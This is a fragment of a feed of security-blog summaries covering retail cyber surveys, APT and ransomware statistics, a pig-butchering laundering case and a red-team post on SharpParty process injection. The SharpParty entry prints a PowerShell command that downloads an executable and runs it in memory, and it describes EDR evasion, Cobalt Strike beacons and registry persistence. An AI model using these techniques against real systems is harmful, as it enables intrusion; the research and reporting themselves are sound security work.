      "summary": "The future of retail cybersecurity : Explore insights from 220 retail executives on managing AI-driven threats and closing the cyber resilience gap. 44% of retail organizations report a sharp increase in cyberattacks , underscoring the urgent need for stronger cybersecurity defenses across the sector. 34% of retailers experienced a data breach in the past year, revealing the persistent vulnerabilities in retail cybersecurity strategies. The last year has seen the retail sector fixed squarely in the sights of threat actors, as several of the largest attacks involved several of the world\u2019s best known retail brands, including Harrods , Marks & Spencer , and Victoria\u2019s Secret . The 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector provides context for these attacks, with 44% saying they are experiencing a significantly higher volume of attacks and 34% of retailers surveyed noting that their organization in fact suffered a breach in the last year. These figures are from a worldwide survey of 220 retail executives conducted by LevelBlue earlier this year. The intent was to uncover whether retail organizations are incorporating enterprise-level cyber resilience strategies and to determine their major cybersecurity concerns moving forward. The survey revealed a roller coaster ride of answers with retailers expressing both confidence in their ability to repel certain types of attacks and concern over being unprepared for others. The AI Conundrum The survey made it clear that retail executives are concerned about and expect AI-powered attacks to take place. Showing an odd dichotomy, 49% of those surveyed said they are highly or very highly competent at defending themselves against AI-based attacks, but only 25% go on to say they are prepared to deal with such incidents. Perhaps reflecting their possible overconfidence in their ability to defend against AI attacks, 52% replied that they are highly or very highly competent at implementing and using AI to enhance cybersecurity. The vast majority are so confident in their ability to implement AI-powered security that only 32% are reluctant to implement AI tools and technologies because of possible associated cybersecurity ramifications. Alignment for Success The need for cybersecurity teams to integrate with the organization's lines of business is starting to gain traction, with 44% of the surveyed saying they have effectively aligned business risk appetites with cybersecurity risk management. This is aided by the fact that 49% of the executives noted that communication channels between cybersecurity and line-of-business teams are effective. This level of alignment falls off when it comes to implementing security measures with new projects, as only 37% allocate a cybersecurity budget to new initiatives from the beginning, which is significantly lower than the global average of 46%. A Cybersecurity Culture Gap It is well understood that creating an environment in which all workers understand they are an integral part of their firm\u2019s cybersecurity architecture is essential to building a strong security culture. Unfortunately, the survey found only 40% say they have an effective company-wide cybersecurity culture. One avenue to consider for improving this figure would be using outside expertise to enhance their workforce\u2019s cybersecurity measures. However, only about one-third have engaged external support for training and awareness in the past 12 months, and this figure is not expected to change in the coming years. These are just a few of the dozens of topics covered in the 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector . The report offers a comprehensive look into how retailers are responding to escalating cyber threats.

      "title": "SharpParty: Process Injection in C#",
      "summary": "Introduction As Anti-Virus and EDR solutions improve in detection and response capabilities, the job of a red teamer can become quite arduous. Malware payloads and techniques that once dominated networks have failed the test of time as EDR becomes aware of them. If your initial access payloads are detected immediately, your six-week long red team could be dead on arrival. Additionally, real-world threat actors have an abundance of time and resources; just imagine all the payloads, techniques, and 0-days that a sophisticated threat actor group may have developed over the years. It is essential for red teams to continuously develop their tactics, techniques, and procedures (TTPs) for the purpose of emulating real-life threat actors that are ever evolving. In this blog post, Stroz Friedberg, a LevelBlue company, introduces an addition to the red teamers\u2019 toolkit called \u201cSharpParty\u201d \u2013 a C# implementation of the process injection techniques dubbed \u201cPoolParty\u201d. We want to be very clear here: Stroz Friedberg did not create PoolParty nor did Stroz Friedberg extend the research into Windows Thread Pools. Rather, Stroz Friedberg simply translated the original source code of SafeBreach Labs from C++ to C#. The goal here is to give red teamers more options when picking their payloads. You can download SharpParty from our GitHub repository . Process Injection Before we dive into PoolParty, we must understand what process injection is first. Process injection is a relatively simple concept: inject code into another process. The purpose of injecting code into another process is to hide and obscure malicious activities. The actual implementation of process injection, however, is not as simple. If you would like to learn more about process injection, please refer to the following URLs: https://attack.mitre.org/techniques/T1055/ https://github.com/plackyhacker/Shellcode-Injection-Techniques Pool Party SafeBreach Labs masterfully exemplified the necessity of continuous TTP development through the release of \u201cPoolParty\u201d \u2013 a suite of process injection techniques that target Windows Thread Pools. With this research, SafeBreach Labs was able to bypass five of the leading EDR vendors. They also released a Proof-of-Concept GitHub repository , with source code written in C++. In short, PoolParty injects code into processes by crafting and inserting legitimate work items into a process\u2019 thread pool. A work item is a structure that contains a task specification, including specific conditions and code to execute when these conditions are met. Injected work items effectively act as the execution primitive, because the work item will execute our code when its conditions are met. For example, a work item can perform an action when a file is modified. The file modification in this example is the execution primitive and we do not have to manually start the execution via something like \u201cCreateRemoteThread\u201d, which is a well-known indicator of process injection. Motivation The primary motivation for a C# implementation is to allow the Pool Party techniques to be used in tools that leverage inline MSBuild tasks in XML files. A Task XML file can include embedded C# code that, when passed to \u201cmsbuild.exe\u201d, will be compiled and executed. While Task XMLs do support C++ (the language the original PoC was written in), they are only supported when the \u201cCppCodeProvider.dll\u201d assembly is present on the target machine. This DLL is included within some Visual Studio installations and is not guaranteed to be present on Windows machines by default. To ensure our payloads would detonate on practically any Windows host, we would need to implement the PoolParty technique in C#. Additionally, a C# implementation of PoolParty can be reflectively loaded into memory via PowerShell: $data = ( new-object net.webclient ) . downloaddata ( 'http://127.0.0.1/sharpparty.exe' ) ; $assem = [ System.Reflection.Assembly ] :: Load ( $data ) ; [ SharpParty.Program ] :: Main ( \"1 666\" . Split () ) ; Lastly, as offensive C# tooling continues to grow in popularity, a C# PoolParty implementation can be integrated into other offensive tooling as part of varying attack chains. For these reasons, Stroz Friedberg began implementation of the \u201cPoolParty\u201d technique in C# \u2013 SharpParty. Efficacy Against EDR During our testing, SharpParty was consistently able to bypass Microsoft Defender for Endpoint (MDE) initially. We submitted a report to Microsoft that demonstrated the bypass in March of 2025, which they validated and subsequently implemented detections for. Since then, we have observed an increase in the number of detections on SharpParty. Other EDR systems have detected and sometimes prevented the execution of SharpParty, largely based on the malicious use of \u201cmsbuild.exe\u201d as well as an unspecified process injection technique. While SharpParty inline tasks have seen increased detections from EDR recently, there are a few things worth noting: SafeBreach Labs publicly released their research on process injection via Windows Thread Pools, enabling EDR vendors to implement detections and monitoring for this technique. The use of inline tasks and \u201cmsbuild.exe\u201d is a relatively well-known technique. There is room for further development that could improve the payload\u2019s efficacy against EDR. Ultimately our goal is to give red teams one more item in their toolkit, one more means to meet an end, another test case that evaluates threat detection capabilities. Success Story During our research, we had the opportunity to further test our code on a client engagement. The following is a breakdown of our payload: A Task XML file with C# inline task that contains encrypted SharpParty code and helper functions to fetch the decryption key, decrypt the code, then compile and execute the decrypted code. The beacon shellcode is nested within an additional layer of encryption. HTTP Keying is used to retrieve and validate the decryption key, ensuring connectivity to the C2 server. The execution flow of the payload is depicted in the diagram below: How the dropper executes \u201cmsbuild.exe\u201d on the task XML is dependent on various conditions and is outside the scope of this blog post. With everything tested and ready to go, we joined a call with the client to screenshare the malware detonation. We disguised the payload in such a way that, from the victim\u2019s perspective, it looks like they downloaded a ZIP file and opened a PDF. Under the hood, we successfully executed SharpParty and obtained a Cobalt Strike beacon. After establishing the C2 channel, the client received no alarms on their side at that moment. After about 10 minutes, we suggested a test-case involving persistence via registry run keys to check if this activity is detected. The client agreed and we performed the test-case live on the call, setting an autorun key to execute the same SharpParty payload. Then, we logged out of the workstation, logged back in, and received the second beacon. The client was understandably concerned, seeing as we had established two C2 beacons and they had not received any detections. 30 minutes after detonation, the EDR picked up the malicious use of \u201cmsbuild.exe\u201d and an unspecified malicious payload in our target process, for which the client was alerted. While ultimately this code was still caught, there are two key takeaways: The execution of \u201cmsbuild.exe\u201d is what was picked up by EDR. There are 30 minutes between detonation and detection. While relatively small, this gap may be large enough for a threat actor to pivot within the network and maintain their access. Conclusion In summary, we have developed a C# implementation of PoolParty based on the incredible work from SafeBreach Labs, provided motivation for its existence, and shared a success story. As always, there is room for improvement. We have room to grow in terms of adding more variants, perhaps even discovering new ones, and improving the efficacy against EDR products. Our goal in publishing this blog post and open sourcing SharpParty is to share knowledge with the security community and provide avenues for future research and development.",

      "summary": "Over the passed couple of days, I've had images pop up in my feed showing people's workstations, most often with multiple screens. I've seen various configurations, some with three or more screens, but the other thing I've noted is that for those social media profiles, there's little else that's shared. Yep, they have a nifty configuration, one that they want to show off, but there's little to no attempts to show off their skills and abilities, what they've actually done with that configuration. Within cybersecurity, we see a lot of that, as well with certifications, commercial product licenses, and even open-source distributions - you know, those DVDs or VMs where someone else pulls together a list of free and open-source tools, puts a fancy background and/or menu system on it. A lot of these distros often derive their \"value\" from how new they are, or how many tools are included...but rarely do we see, \"...yeah, and this is how I used this distro to solve a case...\", or anything close to that. We often collect these things, like badges or challenge coins, but is someone really a better analyst if they have 4 instead of 3 screens? I honestly don't know...never having been able to afford multiple screens myself, I've spent the past 28 yrs operating off of single laptop screen. And yes, I have used some of those open-source tools, but I'm not a huge fan of distributions. All of this means that I tend to value something completely different from what the more vocal folks within the industry tend to value. I look to folks trying to develop and share processes and experiences that have the potential to change the direction of the industry.",

      "title": "Crypto-less Crypto Investment Scams: A California Case",
      "summary": "My readers will know by now that I am addicted to PACER - the Public Access to Court Electronic Records. When I see headlines like this one, I am compelled to dive in and read every publicly released document related to the case. USAO Central California The headline last month was that Shengsheng He, a 39 year old Chinese native living in La Puente California (described as being a resident of Los Angeles and Mexico City) had been sentenced to 51 months in prison and ordered to pay restitution in the amount of $26,867,242. The press release quotes Matthew Geleotti from the Attorney General's office: \"The defendant was part of a group of co-conspirators that preyed on American investors by promising them high returns on supposed digital asset investments when, in fact, they stole nearly $37 million from U.S. victims using Cambodian scam centers. Foreign scam centers, purporting to offer investments in digital assets have, unfortunately, proliferated.\" When talking about Crypto Investment Scams, they certainly have \"proliferated.\" They are currently the number one form of cybercrime financial losses in America, for the third year in a row, according to the FBI's IC3.gov. When we refer to these \"Pig Butchering\" scams as Crypto Investment Scams, it is easy to forget that many \"crypto\" scams still rely on the tried and true method of wire transfers to shell companies. When we first started exploring Romance Scams and their link to Business Email Compromise, the mostly Nigerian scammers referred to these as \"Wire-wire jobs.\" A wire goes from the victim to a shell company, and a second wire goes from the shell company to the ultimate beneficiary of the crime. While West African Organized Crime continues unabated, Chinese Organized Crime has taken the top spot and is learning that many of the methods of their West African predecessors are still quite useful. (figures from the ic3.gov 2024 report) In the Shengsheng He case each of the victims believed that they were wiring money to fund their crypto investments. Despite believing they have purchased crypto currency with these funds, they cannot be traced on the blockchain because they do not exist on the blockchain! The first wire transfer went to any of the dozens of shell companies that had been set up across America under the direction of Lu Zhang, an illegal immigrant from China. (Zhang pled guilty to \"conspiracy to commit money laundering on 12NOV2024.) The second wire in the \"wire-wire\" job would then send those funds to one of two bank accounts at Deltec Bank in the Bahamas in the name \"Axis Digital Limited.\" Deltec Bank's website is titled \"Deltec Bank: Ultra-Sophisticated Private Banking\" and boasts of their \"robust anti-money laundering framework.\" Axis Digital Limited served as an off-shore crypto exchange that seems to have been created for the purpose of taking \"wire-wire\" proceeds from Crypto Investment Scams and converting the funds to USDT before transferring them on to the Chinese Organized Crime gangs operating the scam centers in Sihanoukville, Cambodia. The case is being prosecuted in the Central District of California in four parts. Zhang, Wong, Walker, Zhu - Sea Dragon Trading & the Shell Companies One of the cases focuses primarily on the network of US-based shell companies created to receive the wire transfers from the victims. The victims believed they were funding their crypto investments, and would see \"deposits\" into their imaginary crypto investment accounts that corresponded to the amount of their wire transfers. Court records show that \" at least 284 transactions resulted in more than $80 Million in victim losses. \" The defendants in this case, with their ages as of December 14, 2023, were named in an initial press release entitled: \" Four Individuals Charged with Laundering Millions from Cryptocurrency Investment Scmas Known as 'Pig Butchering '\" Lu Zhang - (36, of Alhambra) was sentenced to 24 months + $7,560,014 restitution Joseph Wong - (32, of Rosemead) was sentenced to 51 months + $7,560,014 restitution Justin Walker - (31, of Cypress) was sentenced to 30 months Hailong Zhu - (40, of Naperville, Illinois) has not been sentenced yet Sea Dragon Trading, LLC and Sea Dragon Remodel, Inc were two of the companies created by Hailong Zhu, but the list of shell companies below collectively sent $20,083,987 in wires to Deltec Bank in the Bahamas: \u2022 BFC REMODEL, LLC; - 408 W Glendon Way, San Gabriel, CA 91776 \u2022 BFC SUPPLY, LLC; - 408 W Glendon Way, San Gabriel, CA 91776 \u2022 CREATIVE HOMEGOODS, LLC; - 823 W Huntington Dr. Apt B, Arcadia, CA 91007 \u2022 FUYU COMMERCE, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 GOOD LUCK TRADING, LLC; - 2220 Falling Leaf Ave, Rosemead, CA 91770 \u2022 HONG'S TRADING, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 KAIS TEA SET SUPPLIES, LLC; - 508 Bellows Ct, Diamond Bar, CA 91765 \u2022 LEADING CONSTRUCTION, LLC; - (multiple - unsure) \u2022 LJS REMODELING, LLC; - 1441 Paso Real Ave SPC 254, Rowland Heights, CA 91748 \u2022 LJS SUPPLY, LLC; - 650 W Duarte Rd Suite 100B, Arcadia, CA 91007 \u2022 LQH SUPPLY, LLC; - 823 W Huntington Dr, Apt B, Arcadia, CA 91007 \u2022 MINGXING REMODEL, LLC; - 4661 District Blvd, Vernon, CA 90058 \u2022 MINGXING TRADING, LLC; - 2220 Falling Leaf Ave, Rosemead, CA 91770 \u2022 QAG TRADING, INC. - 8811 Garvey Ave, 202, Rosemead, CA 91770 \u2022 QAG TRADING, LLC; - 3254 Evelyn Ave, Rosemead, CA 91770 \u2022 SEA DRAGON REMODEL, INC; - 4661 District Blvd, Vernon, CA 90058 \u2022 SEA DRAGON TRADING, LLC; - 1140 S El Molino St, Alhambra, CA 91801 \u2022 SHANGHAI FOOD & GROCERIES, LLC; - 250 W Valley Blvd, Ste M, San Gabriel, CA 91776 \u2022 SUNRISE SUPPLY, LLC; - 823 W Huntington Dr. Apt B, Arcadia, CA 91007 \u2022 XIEYUNZHU TRADING, INC; - 1441 71st STreet, Apt 1, Brooklyn, NY 11228 \u2022 YHM SUPPLY, LLC; - 401 S Canyon Blvd Unit C, Monrovia, CA 91016 \u2022 YHM TRADING, LLC; - 401 S Canyon Blvd Unit C, Monrovia, CA 91016 \u2022 YZX LUXURY, LLC; - 1036 S Garfield Ave, B, Alhambra, CA 91801 \u2022 YZX TRENDING, LLC; - 1036 S Garfield Ave, B, Alhambra, CA 91801 Li & Zhang - the Telegram Connection In a second case, the defendants were: Daren Li, 41 Yicheng Zhang (39, of China) (sentenced to 18 months and $1,047,226 in restitution) Zhang & Li controlled four additional shell companies: \u2022 B&C Commerce, LLC - 180 E Valley Blvd Ste 202, San Gabriel, CA 91776 \u2022 Jimei Trading - 785 King St, San Gabriel, CA 91776 \u2022 SMX Beauty, Inc. - 132 E Emerson Ave, Unit C, Monterey Park, CA 91755 \u2022 SMX Travel, Inc. - 132 E Emerson Ave, Unit C, Monterey Park, CA 91755 The DOJ described Daren Li as \"41, a dual citizen of China and St. Kitts and Nevis, and a resident of China, Cambodia, and the UAE.\" He was arrested 12APR2024 at the airport in Atlanta. The DOJ press release \" Two Foreign Nationals Arrested for Laundering at Least $73M through Shell Companies Tied to Cryptocurrency Investment Scams \" says that Li and Zhang (a resident of Temple City, California) \"instructed co-conspirators in the laundering network to open bank accounts in the names of various shell companies. Once the victims sent funds to the shell companies, Li and Zhang monitored the lower-level co-conspirators who transferred the proceeds overseas to bank accounts at Deltec Bank in The Bahamas.\" The funds were then converted to cryptocurrency and sent to wallets, including at least one controlled by Li. Zhang's communications revealed \"extensive coordination to facilitate the international money laundering, including chats discussing the commission structure for the network, various shell companies used, victim information, and at least one video from a co-conspirator calling a U.S. financial institution.\" Daren Li is described as being \"the leader of the syndicate.\" Daren used his Telegram id (@KG71777) to communicate with the Cambodia-based members of the conspiracy. (Daren's email was: darren1575687@gmail.com). In court documents, the primary USDT address of the conspiracy is referred to as \"the TRteo\" address (for the first five characters of the address.) While TRteo is not an uncommon prefix, there are certainly very few such addresses that have received in excess of $39 Million in deposits, much less the higher number mentioned in the press release of $341 Million! In fact, there is only one. Chinese Blockchain intelligence company \"BlockSec\" blogged about that wallet on their QQ page. Using their tool, MetaSleuth, they were able to successfully identify the full wallet address, TRteottJGH5caJyy9qFuM8EJJGGCpDaxx6. The wallet became inactive on 29APR2024, but from its initial transaction on 16APR2021, more than $300 Million USD in more than 16,000 deposits flowed through that address, including transactions to and from HuionePay. BlockSec QQ Post Because Daren Li is described as being in control of this USDT wallet, it is generally considered that he was the leader of this entire enterprise. In July 2022, a meeting was held in Phnom Penh of the top leadership. Daren Li, JingLiang Su, Shengsheng He, and Jose Somarriba were all present. Daren Li also controlled a Binance account that received at least $4.5 Million in USDT that originated from \"Bahamas Account #2.\" He was also the source of funds to create that \"Bahamas Account #2 at Deltec Bank by transferring $999,383 in USDT. Jose Somarriba, Axis Digital, and Itemized Victim Losses Jose Somarriba (55, of Los Angeles) (sentenced to 36 months and $26,867,242.44 in restitution) is being held responsible for the losses from 174 victims. Those victims are listed by their initials and the dollar amounts that each had stolen from them. The average victim lost $154,409.44! (The median loss was $61,250.) The victims who had the most money stolen were in the amounts: $5,616,000; $2,340,000; and $1,030,279! Nine victims experienced a theft of $500,000 or more. (extract from loss amounts for 174 victims) Somarriba was a co-founder of Axis Digital, along with Shengsheng He and Jingliang Su. He was the one who opened the \"Bahamas Account #1\" at Deltec Bank which received $36.9 million in wire transfers from American bank accounts. He prepared fraudulent KYC forms to present to the banks as well as being primarily responsible for converting Deltec funds to USDT and transferring the funds to Cambodia via a USDT wallet referred to as \"TRteo\" in the court documents. Jingliang Su - the Dubai Connection The final of the linked cases is the case of Jingliang Su, (44, of China and Turkey). Su was sentenced to 51 months in federal prison and to pay $26,867,242.44 in restitution. Preferring the name \"James,\" Su resided in Dubai. He was a director of Axis Digital and was a signatory to \"Bahamas Account #1\" at Deltec Bank. He is described as being \"a citizen of China and St. Kitts and Nevis\" and a resident of Cambodia, the UAE, and the People's Republic of China.",

      "title": "Dissecting and Understanding APT Threat Group Activity",
      "summary": "APT Groups prioritize Espionage and data theft: Approximately two-thirds of all Trustwave SpiderLabs-tracked APT group activity is motivated by espionage, targeting government, defense, and telecom sectors primarily in the US, Ukraine, and Russia. Top Attacker Nations : China (41%), Iran (12.5%), and Russia are the leading origins for espionage attacks, emphasizing the critical need for robust threat intelligence to track state-sponsored activity. Beyond Detection: Actionable Threat Intelligence : Trustwave SpiderLabs operationalizes threat intelligence by dissecting APT group Tactics, Techniques, and Procedures (TTPs) and converting them into custom detection rules to dramatically reduce attacker dwell time. Government administration, defense, and finance sector organizations are the primary areas Advanced Persistent Threat (APT) groups are targeting, according to the most recent data from the Trustwave SpiderLabs\u2019 Cyber Threat Intelligence (CTI) team. The team found most attacks are launched from China, Russia, and Iran, with the primary targets residing in the US, Ukraine, and, interestingly, Russia. The groups tracked include Lapsus$, ShinyHunters, and Silk Typhoon. Trustwave\u2019s CTI list is not all-inclusive, but it offers a solid overview of the actors involved, where the attacks are launched from, and the nations undergoing the heaviest attack. SpiderLabs aggregates information continuously from a variety of APT databases maintained by the cybersecurity sector, along with internal reports. Let\u2019s start off with a quick reminder on APT groups and then look at what motivating factors are driving APT activity. APT Defined An Advanced Persistent Threat (APT) is a type of prolonged, targeted cyberattack in which an intruder gains unauthorized access to a network and remains undetected for an extended period, sometimes even months or years. APT groups often use sophisticated toolsets and techniques, such as custom-developed malware, zero-day exploits, and multiple methods to evade traditional security defenses and gain access. Persistence is maintained, as these attackers are not looking for a quick smash-and-grab strike but want long-term access to the network to continuously monitor activity and steal data over a sustained period. They will re-attempt access if initially blocked. APT Group\u2019s Motivating Factors Information Theft and Espionage \u2013 This activity accounts for about two-thirds of all SpiderLabs-tracked APT activity. Our analysts noted that China is responsible for about 41% of these attacks, followed by Iran, conducting 12.5%, and Russia, with 5%. These attacks focused on targets within the US, with Ukraine second most targeted, followed by the British Indian Ocean Territory and Russia. The targets most often hit were government/administration, defense, and telecoms. Financial \u2013 This category covers attackers looking for straight-up financial gain and those attempting crimes against financial institutions. This could include data theft, ransomware, etc. Again, the US was the most targeted nation, followed by Ukraine and Canada. SpiderLabs' insight into which nations housed the attackers is not as clear, with almost half not being known, but of those that are known, Russia is the leader, followed by China. Sabotage and Destruction \u2013 This James Bond-sounding category was the least likely to take place, with instances comprising less than 5% of all attacks. Russia led the way, conducting the most attacks, followed by Iran, striking with the US, Ukraine, Germany, and Israel being the most frequently struck. The most popular targets were the energy, government, defense, and finance sectors. Victimology SpiderLabs has also determined which specific vertical sectors are most often targeted. The government sector, attacked primarily by China-based threat actors, was hit most often, with defense, finance, education, energy, and healthcare all on the receiving end of APT group activity. China, Iran, and Russia were often the home bases for those attacking these groups. SpiderLabs' Direct Role in APT Defense SpiderLabs not only tracks threats but also serves as the instrumental tool that helps Trustwave, A LevelBlue Company, protect its clients, including by defending against APT threats. The information derived for this report is based on the work SpiderLabs does in the field with our clients. The protection offered by Trustwave against APTs is critically dependent on the continuous work of SpiderLabs, which operates across three key areas: 1. Elite Threat Intelligence & TTP Tracking SpiderLabs analysts are dedicated to tracking and analyzing dozens of specific, sophisticated APT groups worldwide (e.g., APT34, APT44/Sandworm, Salt Typhoon, Silver Fox, and Scattered Spider). Dissection of TTPs : The team performs deep analysis on the Tactics, Techniques, and Procedures (TTPs), custom malware, and infrastructure used by these groups. Actionable Intelligence : This proprietary intelligence is immediately converted into custom detection rules and playbooks. These are infused directly into the Trustwave Fusion platform and the client's security tools (e.g., EDR/XDR/SIEM), enabling Trustwave's Security Operations Centers (SOCs) to detect subtle, behavioral anomalies that signature-based tools would miss. 2. Human-Led Advanced Threat Hunting While automated security tools rely on known indicators, APTs specialize in stealth and avoiding detection (known as low-and-slow attacks). SpiderLabs' human expertise is used to find these hidden threats. Hypothesis-Driven Hunts : SpiderLabs experts use a hypothesis-based approach (assuming the client is already breached) to proactively search for indicators of compromise that align with known APT TTPs. MITRE ATT&CK Mapping : Their hunting methodology is mapped to the MITRE ATT&CK framework, allowing them to systematically search for activity across the entire attack chain\u2014from initial access to persistence and command-and-control. Reduced Dwell Time : This proactive hunting significantly reduces the attacker's dwell time (the period an attacker remains in a network undetected,) minimizing the damage an APT can inflict. 3. Incident Response and Preparation If an APT successfully breaches a client, SpiderLabs' forensic and response capabilities are activated immediately. Digital Forensics & Incident Response (DFIR) : The team provides 24/7 global support for emergency breach response, performing forensic investigations to determine the scope, root cause, and identity of the APT actor. Containment and Eradication : They rapidly execute the steps needed to contain the threat and ensure the APT is completely eradicated from the environment. Offensive Security : SpiderLabs' ethical hackers also perform penetration testing and red team exercises that are informed by real-world APT TTPs. This tests a client's defenses against the most advanced adversaries, identifying security gaps before an actual APT exploits them. SpiderLabs ensures that clients are not just protected against general threats, but are specifically fortified against the evolving, state-sponsored, and financially motivated groups that pose the greatest risk.",

      "title": "250 Episodes of Cloud Security Podcast by Google: From Confidential Computing to AI-Ready SOC",
      "summary": "Gemini for Docs improvises So this may suck, but I am hoping to at least earn some points for honesty here. I wanted to write something pithy and smart once I realized our Cloud Security Podcast by Google just aired our 250th episode ( \u201cEP250 The End of \u201cCollect Everything\u201d? Moving from Centralization to Data Access?\u201d ). Yet nothing sufficiently pithy came to my mind \u2026 \u2026 so I went around and asked a whole bunch of AIs and agents and such. Then massaged and aggregated the outputs, then ran more AI on the result. And then lightly curated it. Then deleted the bottom 2 stupidest points they made. So, here it comes \u2026 in all its sloppy glory! The Foundational Roots and Unchanging Mission: Our show started with foundational cloud security topics \u2014 like Zero Trust, Data Security, and Cloud Migration Security which drew the initial large audiences. The core commitment since Episode 1 has been to question conventional wisdom, avoid \u201csecurity theater\u201d ( EP248 ) and explore whether security measures truly benefit the user and the organization. The AI Transformation: We had a sizable shift with the last 50 episodes, where AI became a central theme , or at least one of the themes we always come back to (and, yes, this covers our 3 pillars of securing AI, AI for security and countering the AI-armed attacker). The focus has moved past general hype to practical applications, securing AI systems, and asking challenging questions like \u201cData readiness for AI SOC\u201d ( EP249 ). The Enduring Popularity of Detection & Response (D&R): We highlight that D&R and modernizing the SOC continue to be extremely popular with the audience ( EP236 is epic ). Trace the evolution of this topic from foundational engineering (like the very popular EP75 on scaling D&R at Google ) to the architectural questions in EP250 . \u201cHow Google Does Security\u201d Sells the Tickets : We love the episodes offering a candid look behind Google\u2019s security curtain on topics like internal red teaming, detection scaling, and Cloud IR tabletops. They consistently remain perennial audience favorites (the latest in this series is EP238 on how we use AI agents for security). The Centrality of People and Process: We emphasize the recurring lessons that the most challenging aspects of large-scale cloud (and now AI) security transformations are often the \u201cpeople\u201d and \u201cprocess\u201d elements, not the technical \u201ctech\u201d itself. EP237 is an epic example of this. The Call for Intentionality: We reinforce the importance of having a clear purpose for every security activity and following an engineering-led approach ( EP117 ). The \u201cmagical\u201d advice from EP236 is: to ask of every security element, \u201cwhat is it in service of?\u201d The Persistence of Old Problems: We often lament with a touch of humor on the industry\u2019s tendency to repeat fundamental security mistakes (the SIEM Paradox in EP234 for instance or EP223 in general), underscoring the ongoing need to cover \u201cboring\u201d basics. We will absolutely continue this (a new episode on vulnerability management \u201cstale\u201d problems is coming soon) Community and Format Growth: We continue to \u201csorta-kinda\u201d (human wrote this, eh?) the development of the podcast beyond a purely audio medium , including the launch of live video sessions and a Community site to foster more dialogue and feedback. The Unique Culture and Authenticity of the Show Stays : We remain obsessed about selecting high-energy, vocal, and knowledgeable guests and fun topics. We will keep on with our \u201cinside jokes\u201d like not allowing guests to recommend Anton\u2019s blog as an episode resource and pokes about firewall appliances in the cloud (they are there ). A Glimpse at 300: We want to tease future topics that will define the next 50+ episodes, such as deeper dives into Agentic AI, challenges of cross-cloud incident response and forensics, or the geopolitical aspects of cloud security. Give us ideas, will ya? Otherwise, you will get to hear about AI and D&R much of the time\u2026 Top 5 popular episodes (excluding the oldest 3) EP75 How We Scale Detection and Response at Google: Automation, Metrics, Toil EP153 Kevin Mandia on Cloud Breaches: New Threat Actors, Old Mistakes, and Lessons for All EP47 Megatrends, Macro-changes, Microservices, Oh My!

CWP, or Control Web Panel, is a free server administration tool for enterprise-based Linux distributions like CentOS, which simplifies managing web hosting services. The admin interface (accessible on port 2087 or 2031) and the user interface (accessible on port 2083) serve distinct roles in server management. There are both PHP based applications but the admin interface, secured by HTTPS on port 2087, is designed for system administrators and provides full control over the server, allowing tasks such as configuring web servers (Apache/NGINX), managing DNS, setting up email services, creating user accounts, monitoring resources, and implementing security measures like Config Server Firewall (CSF). It requires root or admin credentials for access. Successful exploitation of this vulnerability could allow an actor to bypass the authentication process and trigger a command injection in the application.",

      "title": "SpiderLabs Ransomware Tracker Update October 2025: Qlin Doubles Down on Attacks",
      "summary": "The worldwide ransomware landscape saw a dramatic shift in attacks in October 2025, jumping 41% month over month, with the most prolific attacker, Qlin, more than doubling the number of attacks it launched, according to Trustwave, A LevelBlue Company, research. The US remained the primary recipient of ransomware attacks, but October saw manufacturing overtake technology as the most targeted vertical sector. The ransomware information was derived from a new SpiderLabs ransomware-tracking tool that gathers information from a variety of open intelligence sources and our own proprietary research. This unique combination of open-source and in-house research provides new insights into ransomware attack trends, the threat groups involved, and their primary targets. The data is not all-inclusive but contains enough information to draw basic conclusions on the direction attacks are taking. October Attack Figures In October 2025, SpiderLabs recorded 722 ransomware attacks worldwide, up from 492 in September 2025 and 635 in October 2024. As noted, the US was the nation most under attack with 298 incidents noted, followed by Canada and France with 45 and 25 attacks, respectively. Top 5 Threat Groups Qlin again dominated the stage, but there were some changes in the top five list. Sinobi appeared in third place, pushing Incransom down to fourth and Play to fifth. A quick breakdown of the new threat actor on the list: According to Ransomware.live, Sinobi became active in July 2025 and has so far specialized in attacking healthcare, manufacturing, and construction firms. Top Threat Groups for October 2025 Threat Groups Oct. 2025 Number of Attacks Threat Groups Sept. 2025 Number of Attacks Qilin 191 or 26.5% Qlin 61 or 15.2% Akira 71 or 9.8% Akira 42 or 10.4% Sinobi 62 or 8.6% Sinobi 36 or 8.9% Incransom 30 or 4.3% Incransom 31 or 7.7% Play 22 or 3.1% Play 29 or 7.2% Top Vertical Sectors Targeted for October 2025 Sector Oct. 2025 Number of Attacks as a % Sector Sept. 2025 Number of Attacks as a % Manufacturing 101 or 14% Business Services 150 or 23.6% Technology 76 or 10.5% Manufacturing 84 or 13.2% Healthcare 59 or 8.2% Technology 79 or 12.4% Business Services 33 or 4.6% Healthcare 63 or 10% Construction 29 or 4% Government 38 or 6% SpiderLabs\u2019 research noted a major shift in targeting when data is examined year over year. In October of 2024, business services were the most often targeted vertical sector, followed by manufacturing and technology. 2025 Ransomware Attacks to Date Threat Group Number of Attacks Target Sector Number of Attacks Qilin 724 or 11.6% Manufacturing 726 or 11.7% Akira 577 or 9.2% Technology 735 or 11.7% Sinobi 419 or 6.7% Healthcare 420 or 6.8% Incransom 332 or 5.3% Business Services 334 or 5.3% Play 283 or 4.5% Financial Services 311 or 5% Total attacks tracked to date for 2025 are 6,251, up dramatically from the 4,660 SpiderLabs saw in 2024. One data point from the target sector list to call out for October is manufacturing supplanted technology as the threat actor\u2019s favorite victim sector. Defending Against Ransomware Trustwave, A LevelBlue Company, offers a number of services and solutions to help organizations defend themselves against ransomware and recover if successfully attacked. Trustwave\u2019s Ransomware Preparedness service , unlike many offerings in the market today, doesn\u2019t focus on singular aspects of a client\u2019s security defense but looks at all critical lines of defense, using detailed insights and aggregated information to provide client security and business leaders. The service provides detailed assessments of the organization\u2019s overall preparedness, an understanding of its existing capabilities to identify, respond to, and recover from a ransomware incident, and identification of the gaps, opportunities, and inherent risks it faces. In addition, Trustwave can help with the basic mitigations all organizations should implement including: Enhance cybersecurity hygiene and patch management Implement robust backup and recovery plans Employee training and awareness Multi-Factor Authentication (MFA) and strong credential management Incident response planning",

      "title": "Analysis Playbooks: USB",
